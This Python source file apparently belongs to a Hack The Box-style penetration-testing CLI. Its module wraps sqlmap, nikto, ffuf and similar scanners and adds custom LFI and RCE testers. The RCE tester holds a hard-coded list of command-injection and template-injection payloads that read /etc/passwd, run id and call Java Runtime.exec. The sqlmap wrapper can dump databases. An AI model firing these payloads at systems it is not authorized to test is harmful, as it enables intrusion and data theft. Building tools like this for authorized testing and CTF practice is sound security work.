"""
HTB Tool — Web Vulnerability Scanning Module

Commands:
  htb web sqli        SQL injection testing (sqlmap)
  htb web xss         XSS detection
  htb web lfi         LFI/RFI testing
  htb web rce         RCE detection (command injection, SSTI)
  htb web nikto       Nikto scan
  htb web whatweb     WhatWeb fingerprinting
  htb web search      SearchSploit search
  htb web fuzz        Fuzzing with ffuf/wfuzz
"""
import subprocess
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse

import click
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from core.config import LFI_PAYLOADS, DEFAULT_THREADS, DIR_WORDLIST
from core.project import (
    require_active_project, save_project, get_project_output_dir,
)
from core.logger import ActivityLogger

console = Console()


def _run_web_tool(cmd: list[str], data: dict, label: str, timeout: int = 600) -> str:
    """Run a web scanning tool, display output, log activity."""
    logger = ActivityLogger(data)
    output_dir = get_project_output_dir(data["name"])

    from ui.helpers import check_tool_installed
    if not check_tool_installed(cmd[0]):
        return ""

    cmd_str = " ".join(cmd)
    console.print(f"\n[bold cyan]⚡ Running:[/] [dim]{cmd_str}[/]\n")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = output_dir / f"{label}_{timestamp}.txt"

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task(f"[cyan]{label}...", total=None)
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout,
            )
        except subprocess.TimeoutExpired:
            console.print(f"[bold yellow]⚠[/] {label} timed out after {timeout}s")
            progress.update(task, completed=True)
            return ""
        progress.update(task, completed=True)

    output = proc.stdout or ""
    if output:
        with open(output_file, "w") as f:
            f.write(output)
        console.print(Panel(
            output[:5000] + ("\n[dim]... (truncated)[/]" if len(output) > 5000 else ""),
            title=f"[bold]{label} Results[/]",
            border_style="green",
        ))

    if proc.stderr:
        stderr_clean = proc.stderr.strip()
        if stderr_clean and len(stderr_clean) < 500:
            console.print(f"[dim]{stderr_clean}[/]")

    logger.log_web(
        test_type=label,
        command=cmd_str,
        output_file=str(output_file),
        summary=f"Completed {label}",
    )
    save_project(data)
    return output


def _get_target_url(data: dict, port: int = 80, scheme: str = "http") -> str:
    """Build target URL from project data."""
    hostname = data["target"].get("hostname")
    ip = data["target"].get("ip")
    host = hostname or ip
    if not host:
        console.print("[bold red]✗[/] No target set.")
        raise SystemExit(1)
    if port == 443:
        scheme = "https"
    return f"{scheme}://{host}:{port}"


# ── Click commands ───────────────────────────────────────────────────────────

@click.group("web")
def web_group():
    """🕸️  Web vulnerability scanning and testing."""
    pass


@web_group.command("sqli")
@click.option("--url", "-u", required=True, help="Target URL with parameter (e.g. http://target/page?id=1)")
@click.option("--forms", is_flag=True, help="Auto-detect and test forms")
@click.option("--dbs", is_flag=True, help="Enumerate databases")
@click.option("--tables", is_flag=True, help="Enumerate tables")
@click.option("--dump", is_flag=True, help="Dump table data")
@click.option("--batch", is_flag=True, default=True, help="Non-interactive mode")
@click.option("--level", type=int, default=3, help="Test level (1-5)")
@click.option("--risk", type=int, default=2, help="Risk level (1-3)")
def web_sqli(url, forms, dbs, tables, dump, batch, level, risk):
    """SQL injection testing with sqlmap."""
    data = require_active_project()

    cmd = ["sqlmap", "-u", url, f"--level={level}", f"--risk={risk}"]

    if forms:
        cmd.append("--forms")
    if dbs:
        cmd.append("--dbs")
    if tables:
        cmd.append("--tables")
    if dump:
        cmd.append("--dump")
    if batch:
        cmd.append("--batch")

    cmd.extend(["--random-agent", "--threads=5"])

    _run_web_tool(cmd, data, "sqlmap-sqli", timeout=900)


@web_group.command("lfi")
@click.option("--url", "-u", required=True, help="Target URL with FUZZ placeholder (e.g. http://target/page?file=FUZZ)")
@click.option("--param", "-p", default=None, help="Vulnerable parameter name")
def web_lfi(url, param):
    """LFI/RFI testing with common payloads."""
    data = require_active_project()
    logger = ActivityLogger(data)
    output_dir = get_project_output_dir(data["name"])

    console.print(f"[bold]📂 LFI/RFI Testing on [cyan]{url}[/][/]\n")

    results = []
    found = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Testing LFI payloads...", total=len(LFI_PAYLOADS))

        for payload in LFI_PAYLOADS:
            if "FUZZ" in url:
                test_url = url.replace("FUZZ", payload)
            elif param:
                # Replace param value
                parsed = urlparse(url)
                test_url = url  # fallback
                if param + "=" in url:
                    parts = url.split(param + "=")
                    rest = parts[1].split("&", 1)
                    test_url = parts[0] + param + "=" + payload
                    if len(rest) > 1:
                        test_url += "&" + rest[1]
            else:
                test_url = url + payload

            try:
                resp = requests.get(test_url, timeout=10, verify=False)
                indicators = ["root:", "daemon:", "[boot loader]", "<?php", "Warning:", "mysql"]
                is_vuln = any(ind.lower() in resp.text.lower() for ind in indicators)

                if is_vuln and resp.status_code == 200:
                    found += 1
                    results.append({
                        "payload": payload,
                        "url": test_url,
                        "status": resp.status_code,
                        "length": len(resp.text),
                    })
                    console.print(f"  [bold red]🔥 VULNERABLE:[/] {payload} [dim](status={resp.status_code}, len={len(resp.text)})[/]")

            except requests.RequestException:
                pass

            progress.advance(task)

    # Summary
    if results:
        table = Table(title=f"LFI Findings ({found} vulnerabilities)", header_style="bold red")
        table.add_column("Payload", style="yellow")
        table.add_column("Status", justify="right")
        table.add_column("Length", justify="right")
        for r in results:
            table.add_row(r["payload"], str(r["status"]), str(r["length"]))
        console.print(table)
    else:
        console.print("[bold green]✓[/] No LFI vulnerabilities detected.")

    logger.log_web("lfi", f"LFI test on {url}", summary=f"Found {found} LFI vulnerabilities")
    save_project(data)


@web_group.command("rce")
@click.option("--url", "-u", required=True, help="Target URL to test for RCE")
@click.option("--param", "-p", default=None, help="Parameter to inject into")
@click.option("--method", "-m", type=click.Choice(["GET", "POST"]), default="GET")
def web_rce(url, param, method):
    """RCE detection — command injection & SSTI testing."""
    data = require_active_project()
    logger = ActivityLogger(data)

    console.print(f"[bold]💉 RCE Testing on [cyan]{url}[/][/]\n")

    # Command injection payloads
    cmd_payloads = [
        "; id", "| id", "|| id", "& id", "&& id",
        "`id`", "$(id)", ";ls", "|ls",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; whoami", "| whoami",
        "%0a id", "%0a%0d id",
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",  # SSTI
        "{{config}}", "{{config.__class__.__init__.__globals__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",  # Java SSTI
    ]

    rce_indicators = ["uid=", "root:", "www-data", "49", "config", "SECRET"]
    ssti_indicators = ["49", "config", "SECRET_KEY"]

    found = 0
    results = []

    for payload in cmd_payloads:
        try:
            if method == "GET":
                if param and param + "=" in url:
                    parts = url.split(param + "=")
                    rest = parts[1].split("&", 1)
                    test_url = parts[0] + param + "=" + payload
                    if len(rest) > 1:
                        test_url += "&" + rest[1]
                    resp = requests.get(test_url, timeout=10, verify=False)
                elif "FUZZ" in url:
                    test_url = url.replace("FUZZ", payload)
                    resp = requests.get(test_url, timeout=10, verify=False)
                else:
                    resp = requests.get(url, params={"cmd": payload}, timeout=10, verify=False)
            else:
                resp = requests.post(url, data={param or "cmd": payload}, timeout=10, verify=False)

            for indicator in rce_indicators + ssti_indicators:
                if indicator in resp.text and resp.status_code == 200:
                    found += 1
                    vuln_type = "SSTI" if indicator in ssti_indicators else "Command Injection"
                    results.append({
                        "payload": payload,
                        "type": vuln_type,
                        "indicator": indicator,
                        "status": resp.status_code,
                    })
                    console.print(
                        f"  [bold red]🔥 {vuln_type}:[/] [yellow]{payload}[/] "
                        f"[dim](indicator: {indicator})[/]"
                    )
                    break

        except requests.RequestException:
            pass

    if results:
        table = Table(title=f"RCE Findings ({found})", header_style="bold red")
        table.add_column("Type", style="red")
        table.add_column("Payload", style="yellow")
        table.add_column("Indicator", style="dim")
        for r in results:
            table.add_row(r["type"], r["payload"], r["indicator"])
        console.print(table)
    else:
        console.print("[bold green]✓[/] No RCE vulnerabilities detected with tested payloads.")

    logger.log_web("rce", f"RCE test on {url}", summary=f"Found {found} RCE vectors")
    save_project(data)


@web_group.command("nikto")
@click.option("--port", "-p", default=80, type=int)
@click.option("--ssl", is_flag=True, help="Use HTTPS")
def web_nikto(port, ssl):
    """Run Nikto web vulnerability scanner."""
    data = require_active_project()
    target = data["target"].get("hostname") or data["target"].get("ip")
    if not target:
        console.print("[bold red]✗[/] No target set.")
        raise SystemExit(1)

    cmd = ["nikto", "-h", f"{'https' if ssl else 'http'}://{target}:{port}"]
    _run_web_tool(cmd, data, "nikto", timeout=900)


@web_group.command("whatweb")
@click.option("--port", "-p", default=80, type=int)
def web_whatweb(port):
    """WhatWeb technology fingerprinting."""
    data = require_active_project()
    url = _get_target_url(data, port)
    _run_web_tool(["whatweb", "-a", "3", url], data, "whatweb")


@web_group.command("search")
@click.argument("term")
def web_search(term):
    """Search for exploits with SearchSploit."""
    data = require_active_project()
    _run_web_tool(["searchsploit", term], data, f"searchsploit-{term}")


@web_group.command("fuzz")
@click.option("--url", "-u", required=True, help="URL with FUZZ placeholder")
@click.option("--wordlist", "-w", default=None, help="Wordlist path")
@click.option("--method", "-m", type=click.Choice(["GET", "POST"]), default="GET")
@click.option("--filter-code", "-fc", default=None, help="Filter status codes (e.g. 404)")
@click.option("--filter-size", "-fs", default=None, help="Filter response size")
@click.option("--tool", "-t", type=click.Choice(["ffuf", "wfuzz"]), default="ffuf")
@click.option("--threads", default=DEFAULT_THREADS, type=int)
def web_fuzz(url, wordlist, method, filter_code, filter_size, tool, threads):
    """Fuzzing with ffuf or wfuzz."""
    data = require_active_project()

    if not wordlist:
        wordlist = str(DIR_WORDLIST) if DIR_WORDLIST.exists() else "/usr/share/wordlists/dirb/common.txt"

    if tool == "ffuf":
        cmd = ["ffuf", "-u", url, "-w", wordlist, "-t", str(threads), "-c"]
        if method == "POST":
            cmd.extend(["-X", "POST"])
        if filter_code:
            cmd.extend(["-fc", filter_code])
        if filter_size:
            cmd.extend(["-fs", filter_size])
    else:
        cmd = ["wfuzz", "-w", wordlist, "-u", url, "-t", str(threads), "-c"]
        if filter_code:
            cmd.extend(["--hc", filter_code])
        if filter_size:
            cmd.extend(["--hh", filter_size])

    _run_web_tool(cmd, data, f"{tool}-fuzz")
